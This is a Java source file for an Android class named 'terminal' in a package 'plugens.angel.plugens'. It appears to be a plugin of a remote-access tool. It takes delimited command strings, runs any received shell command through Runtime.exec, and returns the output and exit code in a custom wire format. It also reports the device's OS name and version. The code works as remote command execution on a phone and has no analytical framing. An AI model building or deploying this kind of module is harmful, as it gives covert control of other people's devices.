package plugens.angel.plugens;
import android.content.Context;
import android.os.Build;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.UnsupportedEncodingException;
import java.util.concurrent.TimeUnit;
public class terminal {
    private static String SPL_DATA = "x0D0x";
    private static String SPL_ARRAY = "x0A0x";
    private static String SPL_LINE = "x0L0x";
    private static String OBJ = "<Object>";
    private static int i = -1;
    public Object method(Context c, String s, byte[] b) throws UnsupportedEncodingException {
        byte[] f = "null".getBytes();
        String[] d = s.split(SPL_DATA);
        switch(d[0]){
            case "command":
                try {
                    String s0 = OBJ + SPL_DATA + exec(d[1]) + SPL_DATA + i + SPL_DATA + d[1];
                    f =  s0.getBytes();
                    return f;
                } catch (Exception e) {}
                break;
            case "run":
                StringBuffer output = new StringBuffer();
                String osName = System.getProperty("os.name") ;
                String osVer = System.getProperty("os.version") ;
                output.append(osName + " - " + osVer + SPL_LINE);
                try {
                    String s0 = OBJ + SPL_DATA + output.toString() + SPL_DATA + 0 + SPL_DATA + "";
                    f =  s0.getBytes();
                    return f;
                } catch (Exception e) {}
                break;
        }
        return f;
    }
    private String exec(String command) {
        StringBuffer output = new StringBuffer();
       final Process p;
        try {
            p = Runtime.getRuntime().exec(command);
            int timeoutInSeconds = 10;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                if(!p.waitFor(timeoutInSeconds, TimeUnit.SECONDS)) {
                    p.destroy();
                }
            }else{
                if ( timeoutInSeconds <= 0)
                {
                      p.waitFor();
                }
                else
                {
                    long now = System.currentTimeMillis();
                    long timeoutInMillis = 1000L * timeoutInSeconds;
                    long finish = now + timeoutInMillis;
                    while ( isAlive( p ) && ( System.currentTimeMillis() < finish ) )
                    {
                        Thread.sleep(10);
                    }
                }
            }

            i = p.exitValue();
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            String line = "";
            while ((line = reader.readLine())!= null){
                output.append(line + SPL_LINE);
            }
            p.getInputStream().close();
            p.getOutputStream().close();
            reader.close();
        } catch (Exception e) {
            return "error! > " + e.getMessage() + SPL_LINE;
        }
        String response = output.toString();
        if (response.length() == 0){
            return "null"  ;
        }
        return response;

    }

    public static boolean isAlive( Process p ) {
        try
        {
            p.exitValue();
            return false;
        } catch (IllegalThreadStateException e) {
            return true;
        }
    }










}
